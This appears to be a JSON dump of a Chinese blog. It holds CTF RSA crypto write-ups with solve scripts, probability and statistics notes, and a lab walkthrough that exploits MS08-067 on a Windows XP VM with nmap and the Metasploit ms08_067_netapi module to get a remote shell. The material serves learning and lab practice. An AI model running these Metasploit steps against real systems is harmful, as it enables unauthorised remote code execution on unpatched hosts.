getPrime(512)r = getPrime(512)n = p * q * re = 2 * 65537assert n.bit_length() // 8 - len(flag) &gt; 0padding = get_random_bytes(n.bit_length() // 8 - len(flag))m = bytes_to_long(padding + flag)assert m &lt; nc1p = pow(p, e, n)c1q = pow(q, e, n)cm = pow(m, e, n)c1 = (c1p - c1q) % nc2 = pow(p - q, e, n)print(f\"e = {e}\")print(f\"n = {n}\")# p^e - q^e mod nprint(f\"c1 = {c1}\")# (p-q)^e mod nprint(f\"c2 = {c2}\")# m^e mod nprint(f\"cm = {cm}\")# e = 131074# n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057# c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999# c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472# cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866\n目前我们只知道，，稍加分析：\n\n\\begin{align}\nc_1&=p^e-q^e&(mod\\ n)\\\\\nc_2&=(p-q)^e\\\\\n&=p^e-p^{e-1}q+...-pq^{e-1}+q^e&(mod\\ n)\\\\\nc_1+c_2&=(p^e-q^e)+(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e+p^e-p^{e-1}+...-pq^{e-1})+(q^e-q^e)\\\\\n&=p(p^{e-1}+p^{e-1}-p^{e-2}q+...-q^{e-1})\\\\\n&=k_1p&(mod\\ n)\\\\\nc_1-c_2&=(p^e-q^e)-(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e-p^e)+(-q^e+p^{e-1}q-...+pq^{e-1}-q^e)\\\\\n&=q(-q^{e-1}+p^{e-1}-...+pq^{e-2}-q^{e-1})\\\\\n&=k_2q&(mod\\ n)\\\\\ngcd(c_1+c_2,n)&=gcd(k_1p,n)\\\\\n&=gcd(k_1p,pqr)\\\\\n&=p\\\\\ngcd(c_1-c_2,n)&=gcd(k_2q,n)\\\\\n&=gcd(k_2q,pqr)\\\\\n&=q\\\\\nr&=\\frac{n}{pq}\\\\\n\\end{align}到此我们便可获得p，q，r\n由于，并不与互素，无法直接计算逆元d，但我们知道p，q，r的值，所以便可计算的8个可能值，筛选后即可得到flag\nEXPfrom Crypto.Util.number import *from sympy.ntheory.modular import *from gmpy2 import *from itertools import *e = 131074n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866p=gcd(c1+c2,n)q=gcd(c1-c2,n)r=n//p//q#Tonelli-Shanksdef legendre(a, p):    return pow(a, (p - 1) // 2, p)def tonelli(n, p):    r = []    assert legendre(n, p) == 1, \"not a square (mod p)\"    q = p - 1    s = 0    while q % 2 == 0:        q //= 2        s += 1    if s == 1:        return pow(n, (p + 1) // 4, p)    for z in range(2, p):        if p - 1 == legendre(z, p):            break    c = pow(z, q, p)    r = pow(n, (q + 1) // 2, p)    t = pow(n, q, p)    m = s    t2 = 0    while (t - 1) % p != 0:        t2 = (t * t) % p        for i in range(1, m):            if (t2 - 1) % p == 0:                break            t2 = (t2 * t2) % p        b = pow(c, 1 &lt;&lt; (m - i - 1), p)        r = (r * b) % p        c = (b * b) % p        t = (t * c) % p        m = i    return rphi=(p-1)*(q-1)*(r-1)dp=invert(e//2,p-1)dq=invert(e//2,q-1)dr=invert(e//2,r-1)mp2=pow(cm,dp,p)mq2=pow(cm,dq,q)mr2=pow(cm,dr,r)mp=tonelli(mp2,p)mq=tonelli(mq2,q)mr=tonelli(mr2,r)print(mp)print(mq)print(mr)'''for _mp, _mq, _mr in product([mp, p - mp], [mq, q - mq], [mr, r - mr]):    m = [p, q, r]    v = [_mp, _mq, _mr]    print(long_to_bytes(crt(m, v)[0]))'''for mp1,mq1,mr1 in product([mp,p-mp],[mq,q-mq],[mr,r-mr]):    x=[mp1,mq1,mr1]    y=[p,q,r]    print(long_to_bytes(crt(y,x)[0]))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"superprime [HITCON 2022]","url":"/2023/03/22/superprime/","content":"superprime [HITCON2022]Analyze先上题\ntask.py\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_longdef getSuperPrime(nbits):    while True:        p = getPrime(nbits)        pp = bytes_to_long(str(p).encode())        if isPrime(pp):            return p, ppp1, q1 = getSuperPrime(512)p2, q2 = getSuperPrime(512)p3, q3 = getSuperPrime(512)p4, q4 = getSuperPrime(512)p5, q5 = getSuperPrime(512)n1 = p1 * q1n2 = p2 * p3n3 = q2 * q3n4 = p4 * q5n5 = p5 * q4e = 65537c = bytes_to_long(open(\"flag.txt\", \"rb\").read().strip())for n in sorted([n1, n2, n3, n4, n5]):    c = pow(c, e, n)print(f\"{n1 = }\")print(f\"{n2 = }\")print(f\"{n3 = }\")print(f\"{n4 = }\")print(f\"{n5 = }\")print(f\"{e = }\")print(f\"{c = }\")\noutput.txt\nn1 = 132240475872174910020944408159013384770525986234801028624784519134365862704105251340824787510945183963356820885920367304711310957365047441178683686926111455575911962257698539064559510444855775549001648292058855493337857073693460061212792795075263084221929517773754699732129582794061997056827998985829666251060653380798686353779510948629280009197715644814616657550158740378670095210797455828266323922570838468050733341304227070902756780052159113811360169205531739117518635829837403006788948761106892086004133969899267757339921n2 = 95063555614573541810575593850289506856925979977609991181205616159125089261546784721154599484613262518469706157215924537125160406418217535531993036958388330505871763176297570429533467696205928686731756713059807727405313286020007347211892135226632724359291407913539632339885950358476265995466145680878334722001n3 = 59077122528757446350604269162079270359932342538938986760275099248290981958441838384256597839386787448447136083450980256330743221155636885358548541847176342745397373638152767362253944731433134474562146358334422503033973244936835557423934491676324297243326613498319086748647812745223753746779568080090592100960499863677438403657325762852705171109382084916335379889394829715777901290096314487661584614712488781379507151355301063123233880909931925363322846957197537676660047824476129446066149857051131731840540157488590899311381370266592295206055792990886734933291304077440476730373491475852882163732120626849448728573574411786320772125534383707413572678316508826450778346723441956945169297689138799298561759843280317867927205551400065163199599457n4 = 24589423756497058585126900932611669798817346035509889383925628660158156567930038333401661451846451875869437263666365776498658699865323180836374906288949824205543130261556051807217164348291174483234810669420041361857307271050079366739157441129916338485838528114129985080841445467007786565727910355311119650431197742495274527401569906785121880408809802492383216836691265423297722021017515667257863302820657924121913047547741420413553737917632809270380269758313556777803344394624408862183672919570479289614998783678080936272369083n5 = 185885020243714550225131939334004568560534422416697599024696590344782893162219788079305752632863387855011040772104676488940707663157284194641170875157382507202789029285286466326803699701161968587945867047101502048926016515139728368809523009828247173096909917611001113266938209226483162533302629909322412013492978440863258135181226831155024690292336026753678424906151360739424148666951389956182136072508650529271179749569637083537783283360860102371562796635391549934474381821125255176073752645643893294533330184238070085333427e = 65537c = 44836759088389215801662306050375432910426695023654894661152471598197009644316944364461563733708795401026569460109604554622161444073404474265330567406370705019579756826106816505952084633979876247266812002057927154389274998399825703196810049647324831928277737068842860115202258059693760003397831075633707611377854322143735834890385706873765241863615950449707047454133596389612468366465634011925228326638487664313491916754929381088396403448356901628825906815317934440495749705736715790281606858736722493438754469493049523175471903946974639097168758949520143915621139415847104585816466890751841858540120267543411140490236193353524030168152197407408753865346510476692347085048554088639428645948051171829012753631844379643600528027854258899402371612\nPhase 1首先观察一下函数getSuperPrime(nbits)，其首先生成一个nbits位的素数p，将其转换为字符串后用函数bytes_to_long()再次转换，循环直到结果为素数pp为止，返回值为p，pp，查看一下bytes_to_long()的源码：\ndef bytes_to_long(s):    \"\"\"Convert a byte string to a long integer (big endian).    In Python 3.2+, use the native method instead::        &gt;&gt;&gt; int.from_bytes(s, 'big')    For instance::        &gt;&gt;&gt; int.from_bytes(b'\\x00P', 'big')        80    This is (essentially) the inverse of :func:`long_to_bytes`.    \"\"\"    acc = 0    unpack = struct.unpack    # Up to Python 2.7.4, struct.unpack can't work with bytearrays nor    # memoryviews    if sys.version_info[0:3] &lt; (2, 7, 4):        if isinstance(s, bytearray):            s = bytes(s)        elif isinstance(s, memoryview):            s = s.tobytes()    length = len(s)    if length % 4:        extra = (4 - length % 4)        s = b'\\x00' * extra + s        length = length + extra    for i in range(0, length, 4):        acc = (acc &lt;&lt; 32) + unpack('&gt;I', s[i:i+4])[0]    return acc\n整个函数就是把参数的每一个字节转成16进制然后拼起来，显然，p越大，pp也越大，那么我们便可以对进行二分规约\n#Phrase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m\nPhase 2对和进行分析：\n\n\\begin{align}\nn_2&=p_2*p_3\\\\\n&=(a_{01}+a_{11}*10+a_{21}*{10}^2+...)*(a_{02}+a_{12}*10+a_{22}*{10}^2+...)\\\\\nn_3&=q_2*q_3\\\\\n&=[(a_{01}+48)+(a_{11}+48)*256+...]*[(a_{02}+48)+(a_{12}+48)*256+...]\\\\\nTherefore,\\\\\nn_2&=a_{01}*a_{02}&(mod\\ 10)\\\\\nn_2&=(a_{01}+a_{11}*10)*(a_{02}+a_{12}*10)&(mod\\ {10}^2)\\\\\n&...\\\\\nn_2&=(a_{01}+...+a_{n1}*{10}^n)*(a_{02}+...+a_{n2}*{10}^{n})&(mod\\ {10}^{n+1})\\\\\n\\\\\nn_3&=(a_{01}+48)*(a_{02}+48)&(mod\\ 256)\\\\\n...\\\\\nn_3&=[(a_{01}+48)+...+(a_{n1}+48)*{256}^n]*[(a_{02}+48)+...+(a_{n2}+48)*{256}^n]&(mod\\ {256}^{n+1})\n\\end{align}所以可以对每一位进行爆破\n#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)\nPhase 3第三部分很简单，可以直接参照第一部分，只是这里有一些小变化，，仍然进行二分规约\n#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))\n所有的p和q都知道了，直接进行RSA解密即可得到flag\nEXPfrom Crypto.Util.number import *from gmpy2 import *#Phase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))#breakwith open(\"output.txt\") as f:    exec(f.read())p1,q1=break1(n1)(p2,p3),(q2,q3)=break2(n2,n3)(p4,q5),(p5,q4)=break3(n4,n5)phi1=(p1-1)*(q1-1)phi2=(p2-1)*(p3-1)phi3=(q2-1)*(q3-1)phi4=(p4-1)*(q5-1)phi5=(p5-1)*(q4-1)d1=invert(e,phi1)d2=invert(e,phi2)d3=invert(e,phi3)d4=invert(e,phi4)d5=invert(e,phi5)c=pow(c,d3,n3)c=pow(c,d4,n4)c=pow(c,d5,n5)c=pow(c,d1,n1)c=pow(c,d2,n2)print(long_to_bytes(c))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"概率论与数理统计知识梳理（七）","url":"/2023/04/17/Probability-theory-and-mathematical-statistics_Chapter_8/","content":"概率论与数理统计第八章 参数的区间估计与假设检验8.1 区间估计\n置信区间的定义：设总体的分布函数为，其中为未知参数，为来自总体的简单随机样本，对于给定的，如果由样本确定的两个统计量和满足，则称随机区间是参数的置信度为的置信区间。如果统计量满足，则称是参数的置信度为的单侧置信上限（下限）\n对于给定的置信度，参数的区间估计的基本思想是：\n从正态总体的六个已知的抽样分布（单总体、双总体各三个）中选一个只有含有待估参数而不包含其他未知参数的抽样分布，记为\n由于一定是四大分布（）中的一个，所以它的分位点能从表中查到，且必然满足\n由于中含有待估参数，所以可从不等式中解出，得到等价的不等式，而就是置信度为的置信区间\n\n\n\n8.2 假设检验\n原假设：，备择假设：，备择假设是原假设的对立假设，和有且仅有一个是正确的\n双侧检验与单侧检验\n形如的假设检验称为双侧检验\n形如或的假设检验称为右侧检验\n形如或的假设检验称为左侧检验\n\n\n小概率事件原则是指概率很小的事件在一次试验中不会发生\n两类错误\n第一类错误：弃真，当实际上为真时，检验结果却是拒绝，称之为弃真。犯第一类错误的概率就是显著性水平，即拒绝为真\n第二类错误:采伪，当实际上不为真时，检验结果却是接受，称之为采伪。犯第二类错误的概率通常记作，即接受不为真\n犯这两类错误的概率不可能同时减小，通常的做法是在给定犯第一类错误的概率的条件下，尽量减小犯第二类错误的概率\n\n\n假设检验的基本步骤（以双侧检验为例）\n根据实际问题提出原假设和备择假设接受\n从正态总体的六个已知抽样分布（单总体、双总体各三个）中选一个只含有待检验参数而不包含其他未知参数的抽样分布，记为，并称之为检验统计量\n由于一定是四大分布中的一个，所以它的分位点能从表中查到，且必然满足$P\\{YY_{\\alpha/2}=\\alpha\\}，那么YY_{\\alpha/2}$就是小概率事件，今后称之为拒绝域\n由于中没有未知参数，所以将已知数据带入即可把求出\n如果$YY_{\\alpha/2}有一个成立，就拒绝H_0，否则接受H_0$\n如果是左侧检验或右侧检验，那么只需要将$P\\{YY_{\\alpha/2}=\\alpha\\}换成P\\{YY_\\alpha\\}=\\alpha，此时拒绝域分别为YY_\\alpha$\n\n\n\n","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics","Probability theory"]},{"title":"RPC-exploit - MS08-067","url":"/2023/03/23/rpc-exploit/","content":"\n\nMS08-067 (aka CVE-2008-4250) 漏洞复现前期准备RPC漏洞\nRPC是什么\n\n​        RPC（Remote Procedure Call， 远程过程调用）是操作系统的一种消息传递功能，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。\n\n微软的描述为：“一种能允许分布式应用程序调用网络上不同计算机的可用服务的消息传递实用程序。在计算机的远程管理期间使用”\n\n\nRPC的三个过程\n\n通讯协议\n比如：你需要找人在国外干活，那么你可以直接飞过去或者打电话或者通过互联网的形式，去找人，这个找人的过程就是通讯协议\n\n寻址\n既然要找人干活，肯定要知道地址在哪，飞过去需要找到详细地址，打电话需要知道电话号码，互联网需要知道IP是多少\n\n数据序列化\n就是说，语言需要互通，才能够让别人干活，之间需要一个大家都懂的语言去交流\n\n\n\n攻击RPC漏洞\n  攻击RPC漏洞其实就是攻击DCOM接口，二者相关联\n\nDCOM（分布式组件对象模型,分布式组件对象模式）是一系列微软的概念和程序接口。利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象，DCOM基于组件对象模型COM，COM提供了一套允许同一台计算机上的客户端和服务器之间进行通信的接口\n\n\n\n复现环境\n攻击机：kali-linux-2022.4-vmware-amd64\n靶机：Windows  XP SP3\n\n复现工具\nMSF\n即Metasploit Framwork，是一个综合性的渗透测试工具，集成信息收集、漏洞扫描、漏洞利用以及提权等功能的工具，目前安装的kali都自带MSF\n\nNmap\n即Network Mapper，是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具。一般情况下，Nmap用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。Nmap可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。\n\n\n漏洞介绍MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化,而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。\n\nWindows的Server服务在处理特制RPC请求时存在缓冲区溢出漏洞，远程攻击者可以通过发送恶意的RPC请求触发这个溢出，导致完全入侵用户系统，SYSTEM权限执行任意指令。对于Windows 2000、XP 和Server 2003，无需认证便可以利用这个漏洞 ，对于Windows Vista和Server 2008，可能需要进行认证。\n\n影响范围Microsoft Windows 2000 Service Pack 4Windows XP Service Pack 2Windows XP Service Pack 3Windows XP Professional x64 EditionWindows XP Professional x64 Edition Service Pack 2Windows Server 2003 Service Pack 1Windows Server 2003 Service Pack 2Windows Server 2003 x64 EditionWindows Server 2003 x64 Edition Service Pack 2Windows Server 2003 SP1Windows Server 2003 SP2Windows Vista 和 Windows Vista Service Pack 1Windows Vista x64 Edition 和 Windows Vista x64 Edition Service Pack 1Windows Server 2008（用于 32 位系统）Windows Server 2008（用于基于 x64 的系统）Windows Server 2008（用于基于 Itanium 的系统）Windows 7 Beta（用于 32 位系统）Windows 7 Beta x64 EditionWindows 7 Beta（用于基于 Itanium 的系统）\n漏洞复现目标获取C:\\GIFT\\目录下的flag\n检测通信首先获取攻击机与靶机各自的IP地址\n\n攻击机（kali）\nIP:192.168.80.128\n\n\n靶机（Windows XP）IP:192.168.80.130\n\n\n\n并且要保证二者能互相通信\nkali能ping通xp\n\nxp能ping通kali\n\n如果发现出现超时等Error，则可能是xp的防火墙未关闭，关闭即可\n检查靶机是否开启了445端口，在cmd中执行netstat -an即可\n\n如图所示TCP 0.0.0.0:445的状态为LISTENING，则说明端口445已被打开\n为什么是”445”端口？\n端口的作用\n我们知道，一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎么区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系，实际上是通过“IP地址+端口号”来区分不同的服务的。\n需要注意的是，端口并不是一一对应的。比如你的电脑作为客户机访问一台WWW服务器时，WWW服务器使用“80”端口与你的电脑通信，但你的电脑则可能使用“3456”这样的端口。如下图所示：\n\n\n端口的分类\n端口共1-65535号，知名端口范围从0到1023，这些端口号一般固定分配给一些服务，大家尽量不要使用。比如21端口分配给FTP服务，25端号分配给SMTP邮件传输协议服务，80端口分配给HTTP服务，135端口分配给RPC远程过程调用服务等等。\n动态端口的范围从1024到65535，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序，在关闭程序进程后，就会释放所占用的端口号。注意，端口冲突就不能正常工作。\n同时，动态端口号也常常被病毒木马程序所利用，如冰河默认连接端口号是7626、WAY 2.4连接端口号是8011、Netspy 3.0连接端口号是7306、YAI病毒连接端口号是1024等等。\n\n常见的端口\n\n\n\n\n黑客通过端口可以干什么\n\n信息收集\n目标探测\n服务判断\n系统判断\n角色分析\n\n\n445端口\n参考链接：https://blog.csdn.net/qq_36119192/article/details/83279527\n比如2017年危害全球的永恒之蓝，就是利用的445端口。\n445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化\n公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。\n\n\n漏洞扫描利用kali的Nmap工具对靶机进行信息搜集，先进入nmap得漏洞插件目录，检查ms08-067模块\n┌──(root㉿kali)-[~/Desktop]└─# cd /usr/share/nmap/scripts                                                                ┌──(root㉿kali)-[/usr/share/nmap/scripts]└─# ls    \n\n现在使用命令nmap --script=vuln 192.168.80.130对靶机进行漏洞扫描：主机存活，445端口开放，且存在MS08-067漏洞。\n\n执行msfconsole，进入MSF\n\n用search ms08-067命令查看可利用模块\n\n使用use exploit/windows/smb/ms08_067_netapi进入模块里，并用show options查看使用说明\n\n其中RHOSTS代表靶机地址，此时为空，需要我们手动设置，而LHOST代表攻击机，IP已被自动设置，使用set rhost 192.168.80.130设置靶机地址\n\n使用exploit进行渗透攻击，并使用shell直接跳转到靶机命令行\n\n找到flag.txt后使用type打开即可\n\n\nflag:flag{n1ce_try_0f_MS08_067}\n漏洞分析MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。\n所谓路径规范化，就是将路径字符串中的[/]转换为[\\]，同时去除相对路径[.\\]和[..\\]。如：**/*/./**   =&gt;  **\\*\\****\\*\\..\\**  =&gt;  **\\**\n在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除[…\\]字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。\n通过IDA Pro打开C:\\windows\\system32\\netapi32.dll，找到漏洞所在的NetpwPathCanonicalize函数并双击。通过观察其流程图CFG可知，此函数并没有直接进行输入路径和规范化，而是调用了下级函数CanonicalizePathName来进行路径整理，将待整理的路径字符串进行规范化，然后再保存到预先分配的输出路径缓冲区buffer中，最终造成缓冲区溢出漏洞。\n","categories":["Vulnerability_recurrence"],"tags":["RPC","MS08-067"]}]